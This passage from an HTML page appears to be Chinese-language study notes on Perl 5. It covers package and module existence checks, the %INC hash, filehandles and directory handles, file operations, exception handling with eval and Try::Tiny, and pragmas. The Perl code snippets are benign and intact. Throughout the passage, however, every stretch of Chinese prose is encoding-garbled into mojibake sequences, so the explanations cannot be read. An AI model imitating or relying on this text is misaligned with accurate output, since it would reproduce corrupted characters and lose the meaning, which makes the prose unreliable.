ä½†å¾ˆå¤šç¨‹åºéœ€ç”¨ä¸ä¸Š <code>Class::MOP</code>.</p><h3 id="æ£€æŸ¥ä¸€ä¸ªåŒ…æ˜¯å¦å­˜åœ¨"><a href="#æ£€æŸ¥ä¸€ä¸ªåŒ…æ˜¯å¦å­˜åœ¨" class="headerlink" title="æ£€æŸ¥ä¸€ä¸ªåŒ…æ˜¯å¦å­˜åœ¨"></a>æ£€æŸ¥ä¸€ä¸ªåŒ…æ˜¯å¦å­˜åœ¨</h3><p>æ£€æŸ¥ä¸€ä¸ªåŒ…æ˜¯å¦å­˜åœ¨, å³æ£€æŸ¥å…¶æ˜¯å¦ä» <code>UNIVERSAL</code> ç»§æ‰¿ä¸‹æ¥, ä¹Ÿå°±å¯ä»¥æ£€æŸ¥è¯¥åŒ…æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œ <code>can()</code> æ–¹æ³•æ¥å®ç°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;$pkg exists&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">eval</span> &#123; $pkg-&gt;can( <span class="hljs-string">&#x27;can&#x27;</span> ) &#125;;<br></code></pre></td></tr></table></figure><p>æš‚æ—¶ä¸çŸ¥é“æ€ä¹ˆç”¨.</p><h3 id="æ£€æŸ¥ä¸€ä¸ªç±»æ˜¯å¦å­˜åœ¨"><a href="#æ£€æŸ¥ä¸€ä¸ªç±»æ˜¯å¦å­˜åœ¨" class="headerlink" title="æ£€æŸ¥ä¸€ä¸ªç±»æ˜¯å¦å­˜åœ¨"></a>æ£€æŸ¥ä¸€ä¸ªç±»æ˜¯å¦å­˜åœ¨</h3><p>ç”±äº Perl 5 å¯¹åŒ…å’Œç±»ä¸åŠ ä»¥ä¸¥æ ¼åŒºåˆ†, æ£€æŸ¥åŒ…å­˜åœ¨æ€§çš„æŠ€å·§åŒæ—¶å¯ç”¨äºæ£€æŸ¥ä¸€ä¸ªç±»æ˜¯å¦å­˜åœ¨.</p><h3 id="æ£€æŸ¥ä¸€ä¸ªæ¨¡å—æ˜¯å¦è¢«åŠ è½½"><a href="#æ£€æŸ¥ä¸€ä¸ªæ¨¡å—æ˜¯å¦è¢«åŠ è½½" class="headerlink" title="æ£€æŸ¥ä¸€ä¸ªæ¨¡å—æ˜¯å¦è¢«åŠ è½½"></a>æ£€æŸ¥ä¸€ä¸ªæ¨¡å—æ˜¯å¦è¢«åŠ è½½</h3><p>å¦‚æœçŸ¥é“æ¨¡å—çš„åç§°, ä½ å¯ä»¥é€šè¿‡æŸ¥çœ‹ <code>%INC</code> å“ˆå¸Œæ¥ç¡®å®š Perl æ˜¯å¦åŠ è½½äº†è¿™ä¸ªæ¨¡å—. è¿™ä¸ªå“ˆå¸Œæ˜¯å’Œ <code>@INC</code> å¯¹åº”çš„, å½“ Perl 5 ç”¨ <code>use</code> å’Œ <code>require</code> åŠ è½½ä»£ç æ—¶, ä¼šåœ¨ <code>%INC</code> ä¸­å­˜å‚¨ä¸€ä¸ªæ¡ç›®, å…¶ä¸­é”®æ˜¯æ¬²åŠ è½½æ¨¡å—çš„è·¯å¾„åŒ–åç§°, å€¼æ˜¯æ¨¡å—å®Œæ•´çš„ç£ç›˜è·¯å¾„.</p><p>æŠŠæ¨¡å—åè½¬æ¢ä¸ºæ­£è§„æ–‡ä»¶å½¢å¼å¹¶æµ‹è¯•åœ¨ <code>%INC</code> å†…æ˜¯å¦å­˜åœ¨ (å³æŠŠ <code>::</code> è½¬æ¢ä¸º <code>/</code>):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">module_loaded</span> </span>&#123;<br>    (<span class="hljs-keyword">my</span> $modname = <span class="hljs-keyword">shift</span>) =~ s!::!/!g;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">exists</span> $INC&#123; $modname . <span class="hljs-string">&#x27;.pm&#x27;</span> &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Test::MockObject</code> å’Œ <code>Test::MockModule</code> æ¨¡å—å¯ç”¨æ¥ä¿®æ”¹ <code>%INC</code>. (ä¼¼ä¹å¯ä»¥ç›´æ¥ä¿®æ”¹)</p><h3 id="æ£€æŸ¥æ¨¡å—çš„ç‰ˆæœ¬"><a href="#æ£€æŸ¥æ¨¡å—çš„ç‰ˆæœ¬" class="headerlink" title="æ£€æŸ¥æ¨¡å—çš„ç‰ˆæœ¬"></a>æ£€æŸ¥æ¨¡å—çš„ç‰ˆæœ¬</h3><p>æ— æ³•ä¿è¯æŸç»™å®šçš„æ¨¡å—æ˜¯å¦æä¾›ç‰ˆæœ¬å·.</p><p>æ‰€æœ‰æ¨¡å—éƒ½ç»§æ‰¿è‡ª <code>UNIVERSAL</code>, å› æ­¤å®ƒä»¬å…¨å«æœ‰ <code>VERSION()</code> æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $mod_ver = $module-&gt;VERSION();<br></code></pre></td></tr></table></figure><p>å¦‚æœç»™å®šçš„æ¨¡å—ä¸è¦†ç›– <code>VERSION()</code> æˆ–ä¸åŒ…å«åŒ…å˜é‡ <code>$VERSION</code>, è¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªæœªå®šä¹‰å€¼.</p><h3 id="æ£€æŸ¥ä¸€ä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨"><a href="#æ£€æŸ¥ä¸€ä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨" class="headerlink" title="æ£€æŸ¥ä¸€ä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨"></a>æ£€æŸ¥ä¸€ä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨</h3><p>ç¡®å®šæŸä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨çš„æœ€ç®€å•æœºåˆ¶å°±æ˜¯å¯¹åŒ…åä½¿ç”¨ <code>can()</code> æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;$func() exists&quot;</span> <span class="hljs-keyword">if</span> $pkg-&gt;can( $func );<br></code></pre></td></tr></table></figure><p>(<code>can()</code> å‡½æ•°åº”è¯¥ä¹Ÿæ˜¯ç»§æ‰¿äº <code>UNIVERSAL</code>)</p><h3 id="æ£€æŸ¥ä¸€ä¸ªæ–¹æ³•æ˜¯å¦å­˜åœ¨"><a href="#æ£€æŸ¥ä¸€ä¸ªæ–¹æ³•æ˜¯å¦å­˜åœ¨" class="headerlink" title="æ£€æŸ¥ä¸€ä¸ªæ–¹æ³•æ˜¯å¦å­˜åœ¨"></a>æ£€æŸ¥ä¸€ä¸ªæ–¹æ³•æ˜¯å¦å­˜åœ¨</h3><p>æ²¡æœ‰æ£€æŸ¥æŸç»™å®šå‡½æ•°ç©¶ç«Ÿæ˜¯å‡½æ•°è¿˜æ˜¯æ–¹æ³•çš„é€šç”¨æ–¹æ³•.</p><h4 id="æœæŸ¥ç¬¦å·è¡¨"><a href="#æœæŸ¥ç¬¦å·è¡¨" class="headerlink" title="æœæŸ¥ç¬¦å·è¡¨"></a>æœæŸ¥ç¬¦å·è¡¨</h4><p>Perl 5 ç¬¦å·è¡¨æ˜¯ä¸€ä¸ªç§ç±»ç‰¹åˆ«çš„å“ˆå¸Œ, å…¶ä¸­çš„é”®æ˜¯åŒ…å…¨å±€ç¬¦å·çš„åç§°, å€¼åˆ™æ˜¯ç±»å‹å›¢. Perl 5 å†…éƒ¨åœ¨æŸ¥æ‰¾è¿™äº›å˜é‡æ—¶ä½¿ç”¨ç±»å‹å›¢.</p><p>é€šè¿‡åœ¨åŒ…åæœ«å°¾æ·»åŠ åŒå†’å·, ä½ å¯ä»¥å°†ç¬¦å·è¡¨å½“ä½œå“ˆå¸Œè®¿é—®. å¦‚ <code>MonkeyGrinder</code> åŒ…çš„ç¬¦å·è¡¨å¯ä»¥é€šè¿‡ <code>%MonkeyGrinder::</code> è®¿é—®.</p><p>å¯ä»¥ç”¨ <code>exists</code> æ“ä½œç¬¦æ£€æŸ¥ç‰¹å®šçš„ç¬¦å·åæ˜¯å¦å­˜åœ¨äºç¬¦å·è¡¨ä¸­.</p><h2 id="é«˜çº§-Perl-é¢å‘å¯¹è±¡"><a href="#é«˜çº§-Perl-é¢å‘å¯¹è±¡" class="headerlink" title="é«˜çº§ Perl é¢å‘å¯¹è±¡"></a>é«˜çº§ Perl é¢å‘å¯¹è±¡</h2><p>è¿™ä¸€èŠ‚å…·ä½“è§ä¹¦</p><h3 id="å¤šç”¨åˆæˆè€Œéç»§æ‰¿"><a href="#å¤šç”¨åˆæˆè€Œéç»§æ‰¿" class="headerlink" title="å¤šç”¨åˆæˆè€Œéç»§æ‰¿"></a>å¤šç”¨åˆæˆè€Œéç»§æ‰¿</h3><h3 id="å•ä¸€èŒè´£åŸåˆ™-SRP"><a href="#å•ä¸€èŒè´£åŸåˆ™-SRP" class="headerlink" title="å•ä¸€èŒè´£åŸåˆ™ (SRP)"></a>å•ä¸€èŒè´£åŸåˆ™ (SRP)</h3><h3 id="ä¸è¦é‡å¤ä½ è‡ªå·±-DRY"><a href="#ä¸è¦é‡å¤ä½ è‡ªå·±-DRY" class="headerlink" title="ä¸è¦é‡å¤ä½ è‡ªå·± (DRY)"></a>ä¸è¦é‡å¤ä½ è‡ªå·± (DRY)</h3><h3 id="Liskov-æ›¿æ¢åŸåˆ™-LSP"><a href="#Liskov-æ›¿æ¢åŸåˆ™-LSP" class="headerlink" title="Liskov æ›¿æ¢åŸåˆ™ (LSP)"></a>Liskov æ›¿æ¢åŸåˆ™ (LSP)</h3><h3 id="å­ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢"><a href="#å­ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢" class="headerlink" title="å­ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢"></a>å­ç±»å‹å’Œå¼ºåˆ¶è½¬æ¢</h3><h3 id="ä¸å¯å˜æ€§"><a href="#ä¸å¯å˜æ€§" class="headerlink" title="ä¸å¯å˜æ€§"></a>ä¸å¯å˜æ€§</h3><h1 id="ç¼–ç¨‹é£æ ¼å’Œæ•ˆèƒ½"><a href="#ç¼–ç¨‹é£æ ¼å’Œæ•ˆèƒ½" class="headerlink" title="ç¼–ç¨‹é£æ ¼å’Œæ•ˆèƒ½"></a>ç¼–ç¨‹é£æ ¼å’Œæ•ˆèƒ½</h1><h2 id="ç¼–å†™å¯ç»´æŠ¤çš„-Perl-ç¨‹åº"><a href="#ç¼–å†™å¯ç»´æŠ¤çš„-Perl-ç¨‹åº" class="headerlink" title="ç¼–å†™å¯ç»´æŠ¤çš„ Perl ç¨‹åº"></a>ç¼–å†™å¯ç»´æŠ¤çš„ Perl ç¨‹åº</h2><h2 id="ç¼–å†™æƒ¯ç”¨è¯­åŒ–çš„-Perl-ç¨‹åº"><a href="#ç¼–å†™æƒ¯ç”¨è¯­åŒ–çš„-Perl-ç¨‹åº" class="headerlink" title="ç¼–å†™æƒ¯ç”¨è¯­åŒ–çš„ Perl ç¨‹åº"></a>ç¼–å†™æƒ¯ç”¨è¯­åŒ–çš„ Perl ç¨‹åº</h2><p>CPAN ä¸Šçš„å‘è¡ŒåŒ…å¦‚ <code>Perl::Critic</code>, <code>Perl::Tidy</code> ä»¥åŠ <code>CPAN::Mini</code> å¯è®©ä½ çš„å·¥ä½œæ›´ç®€å•.</p><h2 id="ç¼–å†™é«˜æ•ˆçš„-Perl-ç¨‹åº"><a href="#ç¼–å†™é«˜æ•ˆçš„-Perl-ç¨‹åº" class="headerlink" title="ç¼–å†™é«˜æ•ˆçš„ Perl ç¨‹åº"></a>ç¼–å†™é«˜æ•ˆçš„ Perl ç¨‹åº</h2><h2 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h2><h3 id="è¾“å…¥å’Œè¾“å‡º"><a href="#è¾“å…¥å’Œè¾“å‡º" class="headerlink" title="è¾“å…¥å’Œè¾“å‡º"></a>è¾“å…¥å’Œè¾“å‡º</h3><p>ä¸ç¨‹åºå¤–ç•Œäº¤äº’çš„ä¸»è¦æœºåˆ¶æ˜¯é€šè¿‡ <mark>æ–‡ä»¶å¥æŸ„</mark>.</p><p>æ–‡ä»¶å¥æŸ„ä»£è¡¨è¾“å…¥è¾“å‡ºé€šé“çš„æŸç§çŠ¶æ€.</p><p><code>DATA</code> ä»£è¡¨å½“å‰æ–‡ä»¶. å½“ Perl å®Œæˆå¯¹æ–‡ä»¶çš„ç¼–è¯‘, å®ƒç•™ç€åŒ…å…¨å±€æ–‡ä»¶å¥æŸ„ <code>DATA</code> ä¸åŠ¨, å¹¶åœ¨ç¼–è¯‘å•å…ƒå°¾æ‰“å¼€å®ƒ.</p><p>å¦‚æœåœ¨ <code>__DATA__</code> æˆ–æ˜¯ <code>__END__</code> åæ”¾ç½®å­—ç¬¦ä¸², å¯ä»¥ä» <code>DATA</code> æ–‡ä»¶å¥æŸ„å¤„è¯»å–å®ƒä»¬. <code>perldoc perldata</code> å¯¹æ­¤ç‰¹æ€§è¿›è¡Œäº†è¯¦ç»†çš„æè¿°.</p><p>é™¤äº†æ–‡ä»¶, è¿˜å¯ä»¥åœ¨æ ‡é‡ä¸Šæ‰“å¼€æ–‡ä»¶å¥æŸ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie;<br><br><span class="hljs-keyword">my</span> $captured_output;<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, \$captured_output;<br><br>do_something_awesome( $fh );<br></code></pre></td></tr></table></figure><p><code>perldoc perlopentut</code> æä¾›äº†æ›´å¤šæœ‰å…³ <code>open</code> å¥‡å½¢æ€ªçŠ¶ç”¨æ³•çš„ç»†èŠ‚, åŒ…æ‹¬å®ƒå¯åŠ¨åŠæ§åˆ¶å…¶ä»–è¿›ç¨‹çš„èƒ½åŠ›, åŒæ—¶ä¹Ÿä»‹ç»äº†å¯ä»¥å¯¹è¾“å…¥è¾“å‡ºè¿›è¡Œæ›´åŠ ç²¾ç»†æ§åˆ¶çš„ <code>sysopen</code> ç”¨æ³•.</p><h3 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h3><p><code>readline</code> ä¹Ÿå¯å†™ä½œ <code>&lt;&gt;</code> .</p><p>æ–‡ä»¶ç»“å°¾ä¸º <code>eof()</code>, é‡åˆ°æ–‡ä»¶ç»“å°¾æ—¶è¿”å› <code>undef</code>.</p><h3 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> $out_fh <span class="hljs-string">&quot;Here&#x27;s a line of text\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ³¨æ„æ²¡æœ‰é€—å·.</p><p>å°†æ–‡ä»¶å¥æŸ„åŒ…è£¹åœ¨å¤§æ‹¬å·ä¸­æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> &#123;$out_fh&#125; <span class="hljs-string">&quot;Here&#x27;s a line of text\n&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="ç‰¹æ®Šæ–‡ä»¶å¥æŸ„å˜é‡"><a href="#ç‰¹æ®Šæ–‡ä»¶å¥æŸ„å˜é‡" class="headerlink" title="ç‰¹æ®Šæ–‡ä»¶å¥æŸ„å˜é‡"></a>ç‰¹æ®Šæ–‡ä»¶å¥æŸ„å˜é‡</h3><p>æ¯è¯»å–ä¸€è¡Œ, Perl 5 éƒ½ä¼šå¢åŠ  <code>$.</code> çš„å€¼, å…¶å¯ä»¥ç”¨ä½œè®¡æ•°å™¨.</p><p><code>readline</code> å°† <code>$/</code> å½“å‰çš„å†…å®¹ä½œä¸ºè¡Œç»“æŸç¬¦.</p><p>å½“å‰æ´»åŠ¨çš„è¾“å‡ºæ–‡ä»¶å¥æŸ„ç¼“å†²ç”± <code>$|</code> å˜é‡æ§åˆ¶, å½“è®¾ç½®ä¸ºéé›¶å€¼æ—¶, Perl åœ¨æ¯æ¬¡å¯¹æ­¤æ–‡ä»¶å¥æŸ„è¿›è¡Œå†™å…¥æ“ä½œåéƒ½ä¼šå†²æ´—è¾“å‡º, å½“è®¾ç½®ä¸ºé›¶å€¼, Perl ä»å°†1é‡‡ç”¨é»˜è®¤çš„ç¼“å†²ç­–ç•¥ (å³ä»…åœ¨æ•°æ®è¶³å¤Ÿå¤šä¸”è¶…å‡ºæŸä¸€é™åˆ¶æ—¶æ‰è¿›è¡Œ IO æ“ä½œ)</p><p>ä½¿ç”¨ <code>FileHandle</code> çš„ <code>autoflush()</code> æ–¹æ³•å¯æ›¿ä»£ <code>$|</code> å…¨å±€å˜é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie;<br><span class="hljs-keyword">use</span> FileHandle;<br><br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;pecan.log&#x27;</span>;<br>$fh-&gt;autoflush( <span class="hljs-number">1</span> );<br></code></pre></td></tr></table></figure><p>å¯åœ¨ <code>perldoc FileHandle</code>, <code>perldoc IO::Handle</code> ä¸­è·å–æ›´å¤šä¿¡æ¯.</p><h3 id="ç›®å½•å’Œè·¯å¾„"><a href="#ç›®å½•å’Œè·¯å¾„" class="headerlink" title="ç›®å½•å’Œè·¯å¾„"></a>ç›®å½•å’Œè·¯å¾„</h3><p>æ‰“å¼€ç›®å½•å¥æŸ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie;<br><br><span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $dirh, <span class="hljs-string">&#x27;/home/monkeytamer/tasks/&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Perl 5.12 æ–°å¢ç‰¹æ€§, <code>while</code> å¾ªç¯ä¸­ <code>readdir</code> ä¼šè®¾ç½® <code>$_</code>, æ­£å¦‚ <code>while</code> ä¸­çš„ <code>readline</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.012</span>;<br><span class="hljs-keyword">use</span> autodie;<br><br><span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $dirh, <span class="hljs-string">&#x27;tasks/circus/&#x27;</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">readdir</span> $dirh) &#123;<br>    <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> /^\./;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Found a task $_!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>closedir</code> å…³é—­.</p><h4 id="æ“ä½œè·¯å¾„"><a href="#æ“ä½œè·¯å¾„" class="headerlink" title="æ“ä½œè·¯å¾„"></a>æ“ä½œè·¯å¾„</h4><p><code>File::Spec</code> æ¨¡å—ä¸ºä»¥å®‰å…¨å¯ä»¥ç§»æ¤åœ°æ“ä½œæ–‡ä»¶è·¯å¾„æä¾›äº†æŠ½è±¡.</p><p>CPAN ä¸Šçš„ <code>Path::Class</code> æ¨¡å—ä¸º <code>File::Spec</code> æä¾›äº†æ›´å¥½çš„æ¥å£. æ›´å¤šä¿¡æ¯å¯è§ <code>Path::Class::Dir</code> å’Œ <code>Path::Class::File</code> æ–‡æ¡£.</p><h3 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h3><p>åœ¨ Perl 5.10.1 ä¹‹å, å¯ä»¥ç”¨å½¢å¦‚ <code>perldoc -f -r</code> çš„æ–¹å¼æ¥æŸ¥çœ‹è¿™äº›æ–‡ä»¶æµ‹è¯•æ“ä½œçš„æ–‡æ¡£.</p><p><code>Cwd</code> æ¨¡å—å…è®¸åˆ¤æ–­å½“å‰ç›®å½•.</p><p><code>chdir</code> å…³é”®å­—å¯ä»¥æ”¹å˜å½“å‰å·¥ä½œç›®å½•.</p><p><code>rename</code> å…³é”®å­—å¯ä»¥é‡å‘½åæˆ–åœ¨ç›®å½•é—´ç§»åŠ¨æŸä¸ªæ–‡ä»¶. æ¥å—ä¸¤ä¸ªæ“ä½œæ•°, æ—§æ–‡ä»¶åå’Œæ–°æ–‡ä»¶å:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> autodie;<br><br><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;death_star.txt&#x27;</span>, <span class="hljs-string">&#x27;carbon_sink.txt&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒæ¨¡å— <code>File::Copy</code> æä¾›äº† <code>copy()</code> å’Œ <code>move()</code> æ¥å¤åˆ¶æ–‡ä»¶.</p><p>å¯ä»¥ç”¨ <code>unlink</code> æ¥åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶.</p><p><code>Path::Class</code> ä¸ºæ£€æŸ¥ç‰¹å®šæ–‡ä»¶å±æ€§å’Œå®Œæ•´åˆ é™¤æ–‡ä»¶æä¾›äº†ä¾¿æ·çš„æ–¹æ³•.</p><h2 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h2><h3 id="æŠ›å‡ºå¼‚å¸¸"><a href="#æŠ›å‡ºå¼‚å¸¸" class="headerlink" title="æŠ›å‡ºå¼‚å¸¸"></a>æŠ›å‡ºå¼‚å¸¸</h3><p><code>die()</code> è®¾ç½®å…¨å±€å˜é‡ <code>$@</code> ä¸ºå…¶å‚æ•°å¹¶ç«‹å³é€€å‡ºå½“å‰å‡½æ•°è€Œä¸è¿”å›ä»»ä½•å€¼.</p><h3 id="æ•è·å¼‚å¸¸"><a href="#æ•è·å¼‚å¸¸" class="headerlink" title="æ•è·å¼‚å¸¸"></a>æ•è·å¼‚å¸¸</h3><p>ä½¿ç”¨ <code>eval</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $fh = <span class="hljs-keyword">eval</span> &#123; open_log_file( <span class="hljs-string">&#x27;monkeytown.log&#x27;</span> ) &#125;;<br></code></pre></td></tr></table></figure><p><code>eval</code> ä»£ç å—å‚æ•°å¼•å…¥äº†æ–°çš„ä½œç”¨åŸŸ, å¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸ, <code>$fh</code> å°†åŒ…å«æ­¤æ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„, å¦‚æœå¤±è´¥, <code>$fh</code> å°†ç»´æŒæœªå®šä¹‰.</p><p>æ£€æŸ¥ <code>$@</code> çš„å€¼æ¥æ£€æµ‹å¼‚å¸¸:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ($@) &#123; ... &#125;<br></code></pre></td></tr></table></figure><p>å°† <code>$@</code> çš„å€¼å¤åˆ¶å‡ºæ¥å¯ä»¥é¿å…åç»­ä»£ç ç ´åå…¨å±€å˜é‡ <code>$@</code> çš„å€¼.</p><p>è‡ªè¡Œç¼–å†™å¼‚å¸¸å¤„ç†æœºåˆ¶çš„æ›¿ä»£, å¯å‚è§ CPAN å‘è¡Œæ¨¡å— <code>Exception::Class</code>.</p><h3 id="å¼‚å¸¸æ³¨æ„äº‹é¡¹"><a href="#å¼‚å¸¸æ³¨æ„äº‹é¡¹" class="headerlink" title="å¼‚å¸¸æ³¨æ„äº‹é¡¹"></a>å¼‚å¸¸æ³¨æ„äº‹é¡¹</h3><p>CPAN <code>Try::Tiny</code> å‘è¡Œæ¨¡å—, æ›´åŠ å‹å¥½:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Try::Tiny;<br><br><span class="hljs-keyword">my</span> $fh = try &#123; open_log_file( <span class="hljs-string">&#x27;monkeytown.log&#x27;</span> ) &#125;<br>         catch &#123; ... &#125;;<br></code></pre></td></tr></table></figure><h3 id="å†…ç½®å¼‚å¸¸"><a href="#å†…ç½®å¼‚å¸¸" class="headerlink" title="å†…ç½®å¼‚å¸¸"></a>å†…ç½®å¼‚å¸¸</h3><p>æœ‰äº›å¼‚å¸¸ä¹Ÿè®¸å€¼çš„æ•è·, è¯­æ³•é”™è¯¯åˆ™ä¸å€¼å¾—.</p><h2 id="ç¼–è¯‘å‘½ä»¤"><a href="#ç¼–è¯‘å‘½ä»¤" class="headerlink" title="ç¼–è¯‘å‘½ä»¤"></a>ç¼–è¯‘å‘½ä»¤</h2><p>å½±å“ç¼–è¯‘å™¨è¡Œä¸ºçš„æ¨¡å—ç§°ä¸ºä¸€æ¡ <mark>ç¼–è¯‘å‘½ä»¤ (pragma)</mark> , æŒ‰ç…§æƒ¯ä¾‹, ç¼–è¯‘å‘½ä»¤çš„åç§°ä¸ºå°å†™, ä»¥ç¤ºä¸å…¶ä»–æ¨¡å—çš„åŒºåˆ«.</p><h3 id="ç¼–è¯‘å‘½ä»¤å’Œä½œç”¨åŸŸ"><a href="#ç¼–è¯‘å‘½ä»¤å’Œä½œç”¨åŸŸ" class="headerlink" title="ç¼–è¯‘å‘½ä»¤å’Œä½œç”¨åŸŸ"></a>ç¼–è¯‘å‘½ä»¤å’Œä½œç”¨åŸŸ</h3><p>å¦‚ <code>warnings</code>, <code>strict</code> å°±æ˜¯ç¼–è¯‘å‘½ä»¤.</p><p>ç¼–è¯‘å‘½ä»¤çš„ä½œç”¨åŸŸä¸è¯æ³•å˜é‡ç›¸åŒ.</p><h3 id="ä½¿ç”¨ç¼–è¯‘å‘½ä»¤"><a href="#ä½¿ç”¨ç¼–è¯‘å‘½ä»¤" class="headerlink" title="ä½¿ç”¨ç¼–è¯‘å‘½ä»¤"></a>ä½¿ç”¨ç¼–è¯‘å‘½ä»¤</h3><p>å¯ä»¥æŒ‡å®šæ‰€éœ€ç¼–è¯‘å‘½ä»¤çš„ç‰ˆæœ¬, ä¹Ÿå¯ä»¥å‘ç¼–è¯‘å‘½ä»¤ä¼ é€’å‚æ•°åˆ—è¡¨ä»¥ä¾¿æ›´å¥½åœ°æ§åˆ¶å…¶è¡Œä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> strict <span class="hljs-string">qw( subs vars )</span>;<br></code></pre></td></tr></table></figure><p>åœ¨ä½œç”¨åŸŸå†…å¯ä»¥ç”¨ <code>no</code> å…³é”®å­—ç¦ç”¨éƒ¨åˆ†æˆ–å…¨éƒ¨ç¼–è¯‘å‘½ä»¤:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> strict;<br><br>&#123;<br>    <span class="hljs-keyword">no</span> strict <span class="hljs-string">&#x27;refs&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æ ¸å¿ƒç¼–è¯‘å‘½ä»¤"><a href="#å¸¸ç”¨æ ¸å¿ƒç¼–è¯‘å‘½ä»¤" class="headerlink" title="å¸¸ç”¨æ ¸å¿ƒç¼–è¯‘å‘½ä»¤"></a>å¸¸ç”¨æ 